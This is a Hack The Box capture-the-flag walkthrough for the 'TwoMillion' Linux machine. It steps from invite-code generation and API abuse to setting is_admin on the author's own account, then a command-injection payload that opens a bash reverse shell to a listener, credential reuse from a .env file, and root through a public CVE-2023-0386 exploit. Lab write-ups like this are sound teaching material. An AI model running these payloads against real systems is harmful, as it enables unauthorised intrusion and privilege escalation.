# TwoMillion — Hack The Box

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Easy |

## Synopsis

TwoMillion is an easy Linux machine that recreates the **original HackTheBox invite-code
registration flow**. Client-side JavaScript reveals an endpoint that generates invite codes;
decoding its (ROT13-encoded) response yields a valid code and lets you register. Authenticated
API enumeration under `/api/v1` exposes an admin branch, and the VPN-generation endpoint
(`/api/v1/admin/vpn/generate`) is vulnerable to **OS command injection**, giving a shell as
`www-data`. Database credentials in `/var/www/html/.env` are reused for SSH as `admin`. A mail
message hints at an unpatched kernel, and **CVE-2023-0386** (OverlayFS `fuse` SUID copy-up)
is used to escalate to **root**.

---

## Enumeration

### Nmap

```bash
nmap -p- --min-rate=5000 -T4 <target>
nmap -p22,80 -sCV <target>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1
80/tcp open  http    nginx (redirects to 2million.htb)
```

Add `2million.htb` to `/etc/hosts`.

### The invite-code flow

`/invite` loads `/js/inviteapi.min.js`. Beautifying it reveals a `makeInviteCode()` function
that POSTs to an endpoint. Calling it directly:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq
```

The response contains an encrypted hint — it is **ROT13**. Decoding it points to
`/api/v1/invite/generate`:

```bash
curl -s -X POST http://2million.htb/api/v1/invite/generate | jq
# {"data":{"code":"<base64>", "format":"encoded"}}
echo '<base64>' | base64 -d
```

Use the decoded code to register at `/invite`, then log in.

---

## Foothold

### API enumeration

Once authenticated, enumerate the API from the exported routes:

```bash
curl -s http://2million.htb/api/v1 -b "PHPSESSID=<cookie>" | jq
```

This lists an **admin** branch, including:

```
GET  /api/v1/admin/auth               -> check if current user is admin
POST /api/v1/admin/vpn/generate       -> generate VPN for a user
PUT  /api/v1/admin/settings/update    -> update settings (can set is_admin)
```

`PUT /api/v1/admin/settings/update` lets a regular user set `"is_admin": 1` on their own
account:

```bash
curl -s -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=<cookie>" -H "Content-Type: application/json" \
  -d '{"email":"<your-email>","is_admin":1}'
```

### Command injection in VPN generation

With admin set, `/api/v1/admin/vpn/generate` takes a `username` that is passed unsanitised to
a shell command. Inject into it:

```bash
curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
  -b "PHPSESSID=<cookie>" -H "Content-Type: application/json" \
  -d '{"username":"test; bash -c \"bash -i >& /dev/tcp/10.10.x.x/4444 0>&1\" #"}'
```

Catch the reverse shell with `nc -lvnp 4444` → shell as **www-data**.

### Credentials from .env → SSH as admin

```bash
cat /var/www/html/.env
# DB_HOST=... DB_USERNAME=admin DB_PASSWORD=<redacted>
ssh admin@2million.htb
```

The password is reused for the local `admin` user. The **user flag** is in `/home/admin/`.

---

## Privilege Escalation — OverlayFS (CVE-2023-0386)

Reading root-readable mail hints at an unpatched kernel:

```bash
cat /var/mail/admin
# "...we need to patch the OverlayFS / FUSE vulnerabilities..."
```

Check the kernel:

```bash
uname -r   # 5.15.x — vulnerable to CVE-2023-0386
```

**CVE-2023-0386** is a flaw in the Linux kernel OverlayFS subsystem: a SUID file copied up
from a `fuse` mount into an overlay keeps its SUID bit with the uid as seen by the privileged
kernel copy-up, allowing an unprivileged user to gain a root-owned SUID binary. Build and run
a public PoC:

```bash
git clone https://github.com/xkaneiki/CVE-2023-0386 && cd CVE-2023-0386
make all
# terminal 1:
./fuse ./ovlcap/lower ./gc
# terminal 2:
./exp
```

```
root@2million:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The **root flag** is at `/root/root.txt`.
